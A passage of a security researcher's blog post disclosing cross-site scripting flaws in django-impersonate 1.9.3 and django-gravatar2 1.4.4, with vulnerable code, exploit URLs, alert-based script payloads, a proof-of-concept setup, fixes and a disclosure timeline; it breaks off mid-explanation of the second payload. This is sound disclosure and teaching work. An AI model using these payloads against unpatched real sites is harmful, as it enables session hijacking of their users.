@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#
+" lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Details about two cross-site scripting vulnerabilities that I reported to django-impersonate and django-gravatar2.">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>XSS in django-impersonate 1.9.3 and django-gravatar2 1.4.4 | Santos Gallegos</title>
+<link href="../../assets/css/all-nocdn.css" rel="stylesheet" type="text/css">
+<meta name="theme-color" content="#222222">
+<meta name="generator" content="Nikola (getnikola.com)">
+<link rel="alternate" type="application/rss+xml" title="RSS" hreflang="en" href="../../rss.xml">
+<link rel="canonical" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/">
+<!--[if lt IE 9]><script src="../../assets/js/html5.js"></script><![endif]--><!-- Custom css --><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="../../assets/css/custom.css" type="text/css" media="all">
+<!-- Cloudflare Web Analytics --><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "f0bcc690290a454ab2e555da28759807"}'></script><!-- End Cloudflare Web Analytics --><meta name="author" content="Santos Gallegos">
+<link rel="prev" href="../xss-in-django-allauth-fb-provider/" title="XSS in django-allauth 0.63.5" type="text/html">
+<meta property="og:site_name" content="Santos Gallegos">
+<meta property="og:title" content="XSS in django-impersonate 1.9.3 and django-gravatar2 1.4.4">
+<meta property="og:url" content="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/">
+<meta property="og:description" content="Details about two cross-site scripting vulnerabilities that I reported to django-impersonate and django-gravatar2.">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2025-02-08T00:00:00-05:00">
+<meta property="article:tag" content="django">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="xss">
+</head>
+<body>
+<a href="#content" class="sr-only sr-only-focusable">Skip to main content</a>
+
+<!-- Menubar -->
+
+<nav class="navbar navbar-expand-md static-top mb-4
+navbar-dark
+bg-dark
+"><div class="container">
+<!-- This keeps the margins nice -->
+        <a class="navbar-brand" href="../../">
+
+            <span id="blog-title">Santos Gallegos</span>
+        </a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#bs-navbar" aria-controls="bs-navbar" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="bs-navbar">
+            <ul class="navbar-nav mr-auto">
+<li class="nav-item">
+<a href="../../archive.html" class="nav-link">Posts</a>
+                </li>
+<li class="nav-item">
+<a href="../../projects/" class="nav-link">Projects</a>
+                </li>
+<li class="nav-item">
+<a href="../../disclosed-vulnerabilities/" class="nav-link">Disclosed vulnerabilities</a>
+                </li>
+<li class="nav-item">
+<a href="../../about/" class="nav-link">About</a>
+
+                
+            </li>
+</ul>
+<ul class="navbar-nav navbar-right"></ul>
+</div>
+<!-- /.navbar-collapse -->
+    </div>
+<!-- /.container -->
+</nav><!-- End of Menubar --><div class="container" id="content" role="main">
+    <div class="body-content">
+        <!--Body content-->
+        
+        
+        
+  
+
+<div class="container mb-3">
+  <div class="row justify-content-sm-center">
+    <div class="col col-sm-8">
+        
+<article class="post-text h-entry hentry postpage" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title" itemprop="headline name"><a href="." class="u-url">XSS in django-impersonate 1.9.3 and django-gravatar2 1.4.4</a></h1>
+
+        <div class="metadata">
+            <p class="byline author vcard p-author h-card"><span class="byline-name fn p-name" itemprop="author">
+                    Santos Gallegos
+            </span></p>
+            <p class="dateline">
+            <a href="." rel="bookmark">
+            <time class="published dt-published" datetime="2025-02-08T00:00:00-05:00" itemprop="datePublished" title="2025-02-08">2025-02-08</time></a>
+            </p>
+                <p class="commentline">
+    
+    <a href="#disqus_thread" data-disqus-identifier="cache/posts/xss-in-djang-impersonate-and-django-gravatar2.html">Comments</a>
+
+
+            
+
+        </p>
+</div>
+        
+
+    </header><div class="e-content entry-content" itemprop="articleBody text">
+    <p>This post details two cross-site scripting (XSS) vulnerabilities I discovered in <a class="reference external" href="https://pypi.org/project/django-impersonate/">django-impersonate</a>,
+and <a class="reference external" href="https://pypi.org/project/django-gravatar2/">django-gravatar2</a>.
+I'm writing about them together because they share the same vulnerability,
+and are similar in other aspects that I'll explain below.</p>
+<nav class="contents local" id="contents" role="doc-toc"><p class="topic-title"><a class="reference internal" href="#top">Contents</a></p>
+<ul class="simple">
+<li><p><a class="reference internal" href="#background" id="toc-entry-1">Background</a></p></li>
+<li>
+<p><a class="reference internal" href="#django-impersonate" id="toc-entry-2">django-impersonate</a></p>
+<ul>
+<li><p><a class="reference internal" href="#the-vulnerability" id="toc-entry-3">The vulnerability</a></p></li>
+<li><p><a class="reference internal" href="#exploitation" id="toc-entry-4">Exploitation</a></p></li>
+<li><p><a class="reference internal" href="#proof-of-concept" id="toc-entry-5">Proof of concept</a></p></li>
+<li><p><a class="reference internal" href="#mitigation" id="toc-entry-6">Mitigation</a></p></li>
+<li><p><a class="reference internal" href="#timeline" id="toc-entry-7">Timeline</a></p></li>
+</ul>
+</li>
+<li>
+<p><a class="reference internal" href="#django-gravatar2" id="toc-entry-8">django-gravatar2</a></p>
+<ul>
+<li><p><a class="reference internal" href="#the-vulnerability-1" id="toc-entry-9">The vulnerability</a></p></li>
+<li><p><a class="reference internal" href="#exploitation-1" id="toc-entry-10">Exploitation</a></p></li>
+<li><p><a class="reference internal" href="#proof-of-concept-1" id="toc-entry-11">Proof of concept</a></p></li>
+<li><p><a class="reference internal" href="#mitigation-1" id="toc-entry-12">Mitigation</a></p></li>
+<li><p><a class="reference internal" href="#timeline-1" id="toc-entry-13">Timeline</a></p></li>
+</ul>
+</li>
+<li><p><a class="reference internal" href="#more-in-common-than-you-think" id="toc-entry-14">More in common than you think</a></p></li>
+<li><p><a class="reference internal" href="#acknowledgements" id="toc-entry-15">Acknowledgements</a></p></li>
+</ul></nav><section id="background"><h2>Background</h2>
+<p>At <a class="reference external" href="https://about.readthedocs.com/">Read the Docs</a>, we use both packages.
+While waiting for my PRs to be reviewed, and taking a break from coding,
+I decided to do a quick security audit of some of our dependencies,
+since both packages have a relatively small codebase,
+they were good candidates for a quick review.</p>
+</section><section id="django-impersonate"><h2>django-impersonate</h2>
+<p><a class="reference external" href="https://pypi.org/project/django-impersonate/">django-impersonate</a> allows you to impersonate other users,
+really useful for debugging and support.</p>
+<section id="the-vulnerability"><h3>The vulnerability</h3>
+<p>After grepping the codebase for common vulnerable patterns,
+I found <a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/helpers.py?rev=fa5d1a703960#L28">this line of code</a> that caught my attention:</p>
+<div class="code"><pre class="code python"><a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-1" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-1" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">get_redir_field</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-2" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-2" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-2"></a>    <span class="n">redirect_field_name</span> <span class="o">=</span> <span class="n">settings</span><span class="o">.</span><span class="n">REDIRECT_FIELD_NAME</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-3" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-3" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-3"></a>    <span class="k">if</span> <span class="n">redirect_field_name</span><span class="p">:</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-4" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-4" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-4"></a>        <span class="n">nextval</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">redirect_field_name</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-5" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-5" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-5"></a>        <span class="k">if</span> <span class="n">nextval</span><span class="p">:</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-6" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-6" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-6"></a>            <span class="k">return</span> <span class="n">mark_safe</span><span class="p">(</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-7" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-7" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-7"></a>               <span class="sa">u</span><span class="s1">'&lt;input type="hidden" name="</span><span class="si">{0}</span><span class="s1">" value="</span><span class="si">{1}</span><span class="s1">"/&gt;'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-8" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-8" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-8"></a>                  <span class="n">redirect_field_name</span><span class="p">,</span> <span class="n">nextval</span><span class="p">,</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-9" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-9" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-9"></a>               <span class="p">)</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-10" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-10" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-10"></a>            <span class="p">)</span>
+<a id="rest_code_8ceac69f9b864d7399bf95229f24ee74-11" name="rest_code_8ceac69f9b864d7399bf95229f24ee74-11" href="#rest_code_8ceac69f9b864d7399bf95229f24ee74-11"></a>    <span class="k">return</span> <span class="sa">u</span><span class="s1">''</span>
+</pre></div>
+<p>You can see that the application is building an HTML input field with the value of a query parameter (if the <code class="docutils literal"><span class="pre">IMPERSONATE["REDIRECT_FIELD_NAME"]</span></code> setting is defined),
+and marking it as safe with <a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.safestring.mark_safe">mark_safe</a>
+(Django won't escape it when including it in a template).
+The problem arises as the query parameter is controlled by the user, and isn't escaped before being included in the string.</p>
+</section><section id="exploitation"><h3>Exploitation</h3>
+<p>Searching for the usage of the <code class="docutils literal">get_redir_field</code> function,
+I found it was used in two views related to listing users:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/views.py?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L106">/impersonate/views.py:106 (list_users)</a></p></li>
+<li><p><a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/views.py?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L134">/impersonate/views.py:134 (search_users)</a></p></li>
+</ul>
+<p>But only the <a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/browse/impersonate/templates/impersonate/search_users.html?rev=ed7f09b3bb9f2168888c15562e29471ea82373c2#L11">template</a>
+rendered from the <code class="docutils literal">search_users</code> view includes the result of the function.</p>
+<!-- rstcheck: ignore-next-code-block -->
+<div class="code"><pre class="code python"><a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-1" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-1" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-1"></a><span class="c1"># impersonate/views.py (search_users)</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-2" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-2" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-2"></a><span class="k">return</span> <span class="n">render</span><span class="p">(</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-3" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-3" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-3"></a>    <span class="n">request</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-4" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-4" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-4"></a>    <span class="n">template</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-5" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-5" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-5"></a>    <span class="p">{</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-6" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-6" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-6"></a>        <span class="s1">'users'</span><span class="p">:</span> <span class="n">users</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-7" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-7" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-7"></a>        <span class="s1">'paginator'</span><span class="p">:</span> <span class="n">paginator</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-8" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-8" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-8"></a>        <span class="s1">'page'</span><span class="p">:</span> <span class="n">page</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-9" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-9" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-9"></a>        <span class="s1">'page_number'</span><span class="p">:</span> <span class="n">page_number</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-10" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-10" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-10"></a>        <span class="s1">'query'</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-11" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-11" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-11"></a>        <span class="s1">'redirect'</span><span class="p">:</span> <span class="n">get_redir_arg</span><span class="p">(</span><span class="n">request</span><span class="p">),</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-12" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-12" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-12"></a>        <span class="s1">'redirect_field'</span><span class="p">:</span> <span class="n">get_redir_field</span><span class="p">(</span><span class="n">request</span><span class="p">),</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-13" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-13" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-13"></a>    <span class="p">},</span>
+<a id="rest_code_93669693abc74e61a26a88f38e8ce4cd-14" name="rest_code_93669693abc74e61a26a88f38e8ce4cd-14" href="#rest_code_93669693abc74e61a26a88f38e8ce4cd-14"></a><span class="p">)</span>
+</pre></div>
+<div class="code"><pre class="code html"><a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-1" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-1" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-1"></a><span class="cm">&lt;!-- impersonate/templates/impersonate/search_users.html --&gt;</span>
+<a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-2" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-2" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"{% url 'impersonate-search' %}"</span> <span class="na">method</span><span class="o">=</span><span class="s">"GET"</span><span class="p">&gt;</span>
+<a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-3" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-3" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-3"></a>   Enter Search Query:<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-4" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-4" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-4"></a>   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">name</span><span class="o">=</span><span class="s">"q"</span> <span class="na">value</span><span class="o">=</span><span class="s">"{% if query %}{{ query }}{% endif %}"</span><span class="p">&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-5" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-5" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-5"></a>   {{redirect_field}}
+<a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-6" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-6" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-6"></a>   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"Search"</span><span class="p">&gt;&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<a id="rest_code_d29cf2a0a1554423bf40b728b1e02c39-7" name="rest_code_d29cf2a0a1554423bf40b728b1e02c39-7" href="#rest_code_d29cf2a0a1554423bf40b728b1e02c39-7"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</pre></div>
+<p>Assuming the application defined the <code class="docutils literal"><span class="pre">IMPERSONATE["REDIRECT_FIELD_NAME"]</span></code> setting as <code class="docutils literal">next</code>,
+the URL used to exploit the vulnerability would be <code class="docutils literal"><span class="pre">/impersonate/search/?next={payload}</span></code>.
+Where <code class="docutils literal">{payload}</code> can be:</p>
+<div class="code"><pre class="code html"><a id="rest_code_6d5fccd15a854af68e8d5c0ed7a77daa-1" name="rest_code_6d5fccd15a854af68e8d5c0ed7a77daa-1" href="#rest_code_6d5fccd15a854af68e8d5c0ed7a77daa-1"></a>"/&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden</span>
+</pre></div>
+<p>What this does is:</p>
+<ul class="simple">
+<li><p>Uses a <code class="docutils literal">"/&gt;</code> to close the <code class="docutils literal">input</code> tag.</p></li>
+<li><p>Injects a script that shows an alert with the current domain.</p></li>
+<li><p>Opens a new tag so the rest of the HTML is not shown as broken.</p></li>
+</ul>
+<p>The payload injected into the template would look like this:</p>
+<div class="code"><pre class="code html"><a id="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-1" name="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-1" href="#rest_code_4b9f2a42b8b744c09ab6326d9f659e59-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"next"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;</span>
+<a id="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-2" name="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-2" href="#rest_code_4b9f2a42b8b744c09ab6326d9f659e59-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-3" name="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-3" href="#rest_code_4b9f2a42b8b744c09ab6326d9f659e59-3"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span><span class="p">/&gt;</span>
+</pre></div>
+</section><section id="proof-of-concept"><h3>Proof of concept</h3>
+<p>I created a <a class="reference external" href="https://github.com/stsewd/poc-xss-django-impersonate">proof of concept</a> to demonstrate the vulnerability, so you can see it in action,
+you just need to have Python and <a class="reference external" href="https://docs.astral.sh/uv/getting-started/installation/">uv</a> installed:</p>
+<p>It consists of a simple Django project with <code class="docutils literal"><span class="pre">django-impersonate==1.9.3</span></code> installed,
+with the <code class="docutils literal"><span class="pre">IMPERSONATE["REDIRECT_FIELD_NAME"]</span></code> setting defined as <code class="docutils literal">next</code>.</p>
+<div class="code"><pre class="code bash"><a id="rest_code_0819ec87925043e291e27c18a364cd86-1" name="rest_code_0819ec87925043e291e27c18a364cd86-1" href="#rest_code_0819ec87925043e291e27c18a364cd86-1"></a>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/stsewd/poc-xss-django-impersonate
+<a id="rest_code_0819ec87925043e291e27c18a364cd86-2" name="rest_code_0819ec87925043e291e27c18a364cd86-2" href="#rest_code_0819ec87925043e291e27c18a364cd86-2"></a>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>poc-xss-django-impersonate
+<a id="rest_code_0819ec87925043e291e27c18a364cd86-3" name="rest_code_0819ec87925043e291e27c18a364cd86-3" href="#rest_code_0819ec87925043e291e27c18a364cd86-3"></a>$<span class="w"> </span>uv<span class="w"> </span>run<span class="w"> </span>manage.py<span class="w"> </span>migrate
+<a id="rest_code_0819ec87925043e291e27c18a364cd86-4" name="rest_code_0819ec87925043e291e27c18a364cd86-4" href="#rest_code_0819ec87925043e291e27c18a364cd86-4"></a><span class="c1"># Create a user to log into the application.</span>
+<a id="rest_code_0819ec87925043e291e27c18a364cd86-5" name="rest_code_0819ec87925043e291e27c18a364cd86-5" href="#rest_code_0819ec87925043e291e27c18a364cd86-5"></a>$<span class="w"> </span>uv<span class="w"> </span>run<span class="w"> </span>manage.py<span class="w"> </span>createsuperuser
+<a id="rest_code_0819ec87925043e291e27c18a364cd86-6" name="rest_code_0819ec87925043e291e27c18a364cd86-6" href="#rest_code_0819ec87925043e291e27c18a364cd86-6"></a>$<span class="w"> </span>uv<span class="w"> </span>run<span class="w"> </span>manage.py<span class="w"> </span>runserver
+</pre></div>
+<ul class="simple">
+<li><p>Go to <code class="docutils literal"><span class="pre">http://127.0.0.1:8000/admin/login/</span></code></p></li>
+<li><p>Log in with the user you created</p></li>
+<li><p>Go to <code class="docutils literal"><span class="pre">http://127.0.0.1:8000/impersonate/search/?next=?next="&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;input</span> <span class="pre">type="hidden</span></code></p></li>
+<li><p>A pop-up with the domain of the page should appear</p></li>
+</ul>
+<p>Showing an alert is just a simple example,
+but an attacker can execute any JavaScript code in the context of the user's session.</p>
+</section><section id="mitigation"><h3>Mitigation</h3>
+<p>You should never use <code class="docutils literal">mark_safe</code> with user-controlled content,
+if you need to build HTML with user-controlled data outside of a template,
+you can use the <a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.format_html">format_html</a> function,
+as you can see in the two commits that fixed the vulnerability:
+<a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/rev/06991a735f290884eec08effb3fa31ed45cc26e5">06991a735f29</a>,
+<a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/rev/33cb8c77262a474869ab94bcb82c5446baf3c228">33cb8c77262a</a>.</p>
+</section><section id="timeline"><h3>Timeline</h3>
+<ul class="simple">
+<li><p><strong>11/06/2024</strong>: Found and reported the vulnerability to the maintainer.</p></li>
+<li><p><strong>13/06/2024</strong>: Maintainer replied and confirmed the vulnerability.</p></li>
+<li><p><strong>14/06/2024</strong>: Maintainer released version 1.9.4 with the fix.</p></li>
+</ul></section></section><section id="django-gravatar2"><h2>django-gravatar2</h2>
+<p><a class="reference external" href="https://pypi.org/project/django-gravatar2/">django-gravatar2</a> allows you to integrate <a class="reference external" href="https://gravatar.com/">Gravatar</a> in your project,
+so you can show the user's avatar based on their email.</p>
+<section id="the-vulnerability-1"><h3>The vulnerability</h3>
+<p>After grepping the codebase for common vulnerable patterns,
+I found this code that caught my attention:</p>
+<iframe frameborder="0" scrolling="no" style="width:100%; height:457px;" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.com%2Ftwaddington%2Fdjango-gravatar%2Fblob%2Fed123f849b5207e11efdfb1b2b0235baa41df356%2Fdjango_gravatar%2Ftemplatetags%2Fgravatar.py%23L24-L41&amp;style=default&amp;type=code&amp;showBorder=on&amp;showLineNumbers=on&amp;showFileMeta=on&amp;showFullPath=on&amp;showCopy=on"></iframe><p>You can see that the application is building an HTML <code class="docutils literal">img</code> tag with several attributes,
+like CSS class, alt text, size, and the URL of the Gravatar image,
+and marking it as safe with <a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.safestring.mark_safe">mark_safe</a>
+(Django won't escape it when including it in a template).
+Of all these attributes, only the URL is being <a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.escape">escaped</a>,
+all other values are used as is.</p>
+<p>I found that the function is used as a <a class="reference external" href="https://docs.djangoproject.com/en/4.2/howto/custom-template-tags/">template tag</a> to render the Gravatar image:</p>
+<iframe frameborder="0" scrolling="no" style="width:100%; height:100px;" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.com%2Ftwaddington%2Fdjango-gravatar%2Fblob%2Fed123f849b5207e11efdfb1b2b0235baa41df356%2Fdjango_gravatar%2Ftemplatetags%2Fgravatar.py%23L56&amp;style=default&amp;type=code&amp;showBorder=on&amp;showLineNumbers=on&amp;showFileMeta=on&amp;showFullPath=on&amp;showCopy=on"></iframe><p>For example, you can use it in a template like this:</p>
+<div class="code"><pre class="code html"><a id="rest_code_d05c2825415643ae8f6cafb400a8ae4f-1" name="rest_code_d05c2825415643ae8f6cafb400a8ae4f-1" href="#rest_code_d05c2825415643ae8f6cafb400a8ae4f-1"></a>{% load gravatar from gravatar %}
+<a id="rest_code_d05c2825415643ae8f6cafb400a8ae4f-2" name="rest_code_d05c2825415643ae8f6cafb400a8ae4f-2" href="#rest_code_d05c2825415643ae8f6cafb400a8ae4f-2"></a>
+<a id="rest_code_d05c2825415643ae8f6cafb400a8ae4f-3" name="rest_code_d05c2825415643ae8f6cafb400a8ae4f-3" href="#rest_code_d05c2825415643ae8f6cafb400a8ae4f-3"></a>{% gravatar user 50 "User profile" %}
+</pre></div>
+<p>In this example, the size and the alt text are hardcoded,
+so there is no way for an attacker to inject arbitrary HTML.
+But what happens if the size or alt text come from the user?
+Then we have a problem, as the values are not escaped before being included in the template.</p>
+<div class="code"><pre class="code html"><a id="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-1" name="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-1" href="#rest_code_a8500bcacb9e4fa9bfde294c52acb93f-1"></a>{% load gravatar from gravatar %}
+<a id="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-2" name="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-2" href="#rest_code_a8500bcacb9e4fa9bfde294c52acb93f-2"></a>
+<a id="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-3" name="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-3" href="#rest_code_a8500bcacb9e4fa9bfde294c52acb93f-3"></a>{% gravatar user 50 user.name %}
+</pre></div>
+</section><section id="exploitation-1"><h3>Exploitation</h3>
+<p>Since the vulnerability is in a template tag,
+exploiting the vulnerability will depend if the application uses the template tag with user-controlled content.
+We can assume that a common alt text is the user's name.</p>
+<div class="code"><pre class="code html"><a id="rest_code_14e1fa4372c04a9a98a126176e7ff613-1" name="rest_code_14e1fa4372c04a9a98a126176e7ff613-1" href="#rest_code_14e1fa4372c04a9a98a126176e7ff613-1"></a>{% load gravatar from gravatar %}
+<a id="rest_code_14e1fa4372c04a9a98a126176e7ff613-2" name="rest_code_14e1fa4372c04a9a98a126176e7ff613-2" href="#rest_code_14e1fa4372c04a9a98a126176e7ff613-2"></a>
+<a id="rest_code_14e1fa4372c04a9a98a126176e7ff613-3" name="rest_code_14e1fa4372c04a9a98a126176e7ff613-3" href="#rest_code_14e1fa4372c04a9a98a126176e7ff613-3"></a>{% gravatar user 50 user.first_name %}
+</pre></div>
+<p>Then the attacker can inject the payload in the user's name.
+A simple payload could be:</p>
+<div class="code"><pre class="code html"><a id="rest_code_2d5056d4270d46fc801fcbce9d784b79-1" name="rest_code_2d5056d4270d46fc801fcbce9d784b79-1" href="#rest_code_2d5056d4270d46fc801fcbce9d784b79-1"></a>"/&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"</span>
+</pre></div>
+<p>What this does is:</p>
+<ul class="simple">
+<li><p>Uses a <code class="docutils literal">"/&gt;</code> to close the <code class="docutils literal">img</code> tag.</p></li>
